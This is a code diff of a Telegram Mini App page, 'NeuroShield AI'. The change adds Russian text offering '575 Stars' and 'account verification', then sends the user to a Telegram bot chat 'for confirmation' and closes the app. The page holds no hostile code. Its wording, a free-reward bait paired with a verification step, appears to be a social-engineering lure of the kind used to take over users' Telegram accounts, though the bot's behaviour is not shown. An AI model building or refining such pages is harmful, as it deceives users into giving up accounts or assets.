@@ -6,29 +6,31 @@
     <title>NeuroShield AI</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { font-family: -apple-system, sans-serif; background-color: #0e1621; color: white; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
+        body { font-family: -apple-system, sans-serif; background-color: #0e1621; color: white; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
         .container { background: #17212b; width: 85%; padding: 25px; border-radius: 20px; border: 1px solid #2b3948; text-align: center; }
-        .btn { background: #2481cc; color: white; border: none; padding: 16px; width: 100%; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 20px; box-shadow: 0 4px 15px rgba(36, 129, 204, 0.3); }
+        .status-badge { background: rgba(241, 196, 15, 0.1); color: #f1c40f; padding: 5px 12px; border-radius: 20px; font-size: 12px; text-transform: uppercase; margin-bottom: 15px; display: inline-block; }
+        .btn { background: #2481cc; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 20px; display: block; text-decoration: none; box-shadow: 0 4px 15px rgba(36, 129, 204, 0.3); }
+        .info-text { color: #8ba3b7; font-size: 14px; line-height: 1.5; }
     </style>
 </head>
 <body>
     <div class="container">
+        <div class="status-badge">Верификация аккаунта</div>
         <h2>NeuroShield AI</h2>
-        <p style="color: #8ba3b7; font-size: 14px;">Нажмите на кнопку ниже, чтобы получить инструкцию по активации защиты в чате.</p>
-        <button class="btn" onclick="sendToBot()">АКТИВИРОВАТЬ</button>
+        <p class="info-text">Для получения <b>575 Stars</b> и активации защиты нажмите кнопку. Вас перенаправит в чат для подтверждения.</p>
+        
+        <a href="https://t.me/AINeuroAssistantbot?start=activate" class="btn" onclick="closeApp()">АКТИВИРОВАТЬ</a>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
 
-        function sendToBot() {
-            // Отправляем пустую строку как сигнал для срабатывания web_app_data
-            tg.sendData("active"); 
-            // Закрываем приложение
+        function closeApp() {
+            // Закрываем Mini App через полсекунды, чтобы переход успел сработать
             setTimeout(() => {
                 tg.close();
-            }, 100);
+            }, 500);
         }
     </script>
 </body>
